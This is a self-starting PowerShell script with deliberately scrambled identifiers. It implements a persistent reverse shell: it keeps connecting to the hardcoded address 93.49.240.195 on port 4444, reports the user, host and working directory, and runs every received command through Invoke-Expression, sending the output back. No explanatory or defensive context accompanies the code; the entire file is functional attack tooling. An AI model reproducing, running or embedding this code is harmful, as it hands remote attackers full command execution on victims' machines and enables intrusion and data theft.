class xvpnnKaoaEeDmM {
    
    [string]$ijTTfEsYblXGzcRLY = "93.49.240.195"
    [int]$ikDscWJgHcqRlltxxPJj = 4444

    $abqTMIZArjUDDkavvfeMmkJ
    $ZKbMidNdYTevsarejgo
    $UTcHFVVEdNxdnWGLFcyD
    $jahEewBkzTee
    $FgJSCAq
    $UgzIrCrfqBEpnbIVOISsaBd
    [int]$GiCpgYUGmWwGiRHuNplyQg = 50*1024

    WEKvZdpcmcoChoxtDLm() {
        $this.ZKbMidNdYTevsarejgo = $false
        while ($true) {
            try {
                $this.ZKbMidNdYTevsarejgo = New-Object Net.Sockets.TcpClient($this.ijTTfEsYblXGzcRLY, $this.ikDscWJgHcqRlltxxPJj)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.VASjNBYd()
    }

    VASjNBYd() {
        $this.abqTMIZArjUDDkavvfeMmkJ = $this.ZKbMidNdYTevsarejgo.GetStream()
        $this.jahEewBkzTee = New-Object Byte[] $this.GiCpgYUGmWwGiRHuNplyQg
        $this.UgzIrCrfqBEpnbIVOISsaBd = New-Object Text.UTF8Encoding
        $this.UTcHFVVEdNxdnWGLFcyD = New-Object IO.StreamWriter($this.abqTMIZArjUDDkavvfeMmkJ, [Text.Encoding]::UTF8, $this.GiCpgYUGmWwGiRHuNplyQg)
        $this.FgJSCAq = New-Object System.IO.StreamReader($this.abqTMIZArjUDDkavvfeMmkJ)
        $this.UTcHFVVEdNxdnWGLFcyD.AutoFlush = $true
    }

    mLdTlHh() {
        $this.WEKvZdpcmcoChoxtDLm()
        $this.ZuWeYGsKTmxLkJ()
    }

    ShdkiOGZlZvPIWfr($SdAAgyZnDCeBeI) {
        try {
            [byte[]]$GfhnePGrAYzYtKQYvN = [text.Encoding]::Ascii.GetBytes($SdAAgyZnDCeBeI)
            $this.UTcHFVVEdNxdnWGLFcyD.Write($GfhnePGrAYzYtKQYvN, 0, $GfhnePGrAYzYtKQYvN.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.mLdTlHh()
        }
    }

    [string] SkwwLXLzdDH() {
        try {
            $JopxJfLgoaO = $this.abqTMIZArjUDDkavvfeMmkJ.Read($this.jahEewBkzTee, 0, $this.GiCpgYUGmWwGiRHuNplyQg)    
            $PRWjhnNDQKU = ($this.UgzIrCrfqBEpnbIVOISsaBd.GetString($this.jahEewBkzTee, 0, $JopxJfLgoaO))
            return $PRWjhnNDQKU
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.mLdTlHh()
            return ""
        }
    }

    [string] DiVfIcPoSIme($qaexxLxy) {
        Write-Host $qaexxLxy
        try { 
            $gMwnitWQbhtlBFf = Invoke-Expression $qaexxLxy | Out-String
        }
        catch {
            $kKEAuUHvgbuRXRlDIlPeTtlS = $_.Exception
            $VEwPGiytmKErzvIeKDqad = $_.Message
            $gMwnitWQbhtlBFf = "`n$_`n"
        }
        return $gMwnitWQbhtlBFf
    }

    [string] MnTpbXPVCTOCzcaLn() {
        $KNLNPBcMSaFnSuDzv = [Environment]::UserName
        $jpVCeYBz = [System.Net.Dns]::GetHostName()
        $JDnZBivlgQIbtGmVNwjg = Get-Location
        return "$KNLNPBcMSaFnSuDzv@$jpVCeYBz [$JDnZBivlgQIbtGmVNwjg]~$ "
    }

    ZuWeYGsKTmxLkJ() {
        while ($this.ZKbMidNdYTevsarejgo.Connected) {
            $this.ShdkiOGZlZvPIWfr($this.MnTpbXPVCTOCzcaLn())         
            $PRWjhnNDQKU = $this.SkwwLXLzdDH()
            $gMwnitWQbhtlBFf = "`n"
            if ([string]::IsNullOrEmpty($PRWjhnNDQKU)) {
                continue
            }
            $gMwnitWQbhtlBFf = $this.DiVfIcPoSIme($PRWjhnNDQKU)
            $this.ShdkiOGZlZvPIWfr($gMwnitWQbhtlBFf + "`n")
            $this.abqTMIZArjUDDkavvfeMmkJ.Flush()
        }
        $this.ZKbMidNdYTevsarejgo.Close()
        $this.mLdTlHh()
    } 
}

$VcdqNxhSvrEgqMzlyDhbCCF = [xvpnnKaoaEeDmM]::new()
$VcdqNxhSvrEgqMzlyDhbCCF.mLdTlHh()
